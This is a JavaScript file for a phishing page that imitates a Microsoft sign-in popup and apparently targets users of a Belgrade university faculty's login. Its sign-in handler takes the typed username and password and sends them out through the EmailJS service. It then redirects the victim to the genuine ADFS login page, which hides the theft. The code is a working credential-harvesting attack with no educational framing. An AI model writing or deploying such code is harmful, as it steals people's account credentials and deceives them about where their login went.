const link = document.getElementById('link');
const fonContainer = document.getElementById('fon-container');
const microsoftPopup = document.getElementById('microsoft-popup-container');
const overlay = document.getElementById('overlay-container');
const signInButton = document.getElementById('sign-in-button');
const username = document.getElementById('username');
const password = document.getElementById('password');

link.addEventListener('click', () => {
  fonContainer.classList.replace('block', 'hidden');
  microsoftPopup.classList.replace('hidden', 'flex');

  setInterval(openPhishingSite, 3000);
});

function openPhishingSite() {
  microsoftPopup.classList.replace('flex', 'hidden');
  overlay.classList.replace('hidden', 'flex');
}

signInButton.addEventListener('click', () => {
  emailjs
    .send('ZRS', 'template_qdm55vd', {
      message: `Username: ${username.value} + Password: ${password.value}`,
    })
    .then(() => {
      //alert('Email sent successfully!');
      window.open(
        'https://fs.fon.bg.ac.rs/adfs/ls/?wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline/',
        '_self'
      );
    })
    .catch((err) => {
      //console.error('Failed to send email:', err);
      //alert('Oops! Something went wrong.');
    });
});
